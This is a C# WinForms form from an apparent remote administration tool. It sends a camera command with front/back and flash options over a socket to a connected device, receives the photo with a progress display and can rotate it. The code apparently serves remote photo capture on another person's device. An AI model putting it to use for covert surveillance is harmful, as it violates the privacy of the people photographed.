using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Kamera : Form
    {
        Socket soketimiz;
        public string ID = "";
        public int max = 0;
        public Kamera(Socket s, string aydi)
        {
            soketimiz = s;
            ID = aydi;
            InitializeComponent();
        }
        public void Receive(Socket socket, byte[] buffer, int offset, int size, int timeout)
        {
                //int startTickCount = Environment.TickCount;
                int received = 0;
                do
                {
                    //if (Environment.TickCount > startTickCount + timeout)
                    //  throw new Exception("Timeout.");
                    try
                    {
                        received += socket.Receive(buffer, offset + received, size - received, SocketFlags.None);
                        try
                        {
                            Application.DoEvents();
                            decimal max_ = size;
                            decimal receiv = received;
                            int per = Convert.ToInt32((receiv / max_) * 100);
                            progressBar1.Value = per;
                            label4.Text = "Alınıyor %" + per.ToString();
                            label3.Text = received.ToString() + " byte";
                        }
                        catch (Exception) { }
                    }
                    catch (SocketException ex)
                    {
                        if (ex.SocketErrorCode == SocketError.WouldBlock ||
                            ex.SocketErrorCode == SocketError.IOPending ||
                            ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                        {
                            Thread.Sleep(30);
                        }
                        else
                           { break; }
                    }
                } while (received < size);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            label1.Visible = false;
            try
            {
                Text = "Kamera";
                label3.Text = "byte";
                string cam = "";
                string flashmode = "";
                cam = radioButton1.Checked ? "1" : "0";
                button1.Enabled = false;
                flashmode = checkBox1.Checked ? "1" : "0";
                byte[] bit = Encoding.UTF8.GetBytes("CAM|" + cam + "|" + flashmode + "|");
                Gonderici.Send(soketimiz, bit, 0, bit.Length, 59999);
                label2.Text = "Çekiliyor..";
            }
            catch (Exception) { }


        }
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);

            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(RotateFlipType.Rotate90FlipNone);
            return bmp;
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                pictureBox1.Image = RotateImage(pictureBox1.Image);
            }
        }
    }
}